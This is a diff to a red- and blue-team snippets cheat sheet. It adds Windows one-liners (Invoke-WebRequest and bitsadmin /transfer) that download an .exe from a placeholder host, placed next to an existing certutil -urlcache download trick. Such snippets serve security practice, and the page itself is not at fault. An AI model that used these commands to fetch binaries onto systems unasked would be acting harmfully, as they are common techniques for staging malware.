@@ -5,6 +5,13 @@ red and blueteam snippets
 ```powershell
 certutil -f -split -urlcache http://example.com/myfile.txt C:\myfile.txt 
 powershell iwr -uri http://example.com/myfile.txt -OutFile C:\myfile.txt
+powershell Invoke-WebRequest -Uri "https://example.com/file.exe" -OutFile "C:\Temp\file.exe"
+
+bitsadmin /transfer MyJob /download /priority normal ^
+https://example.com/file.exe ^
+C:\Downloads\file.exe
+
+
 ```
 
 ### uploading a file with curl
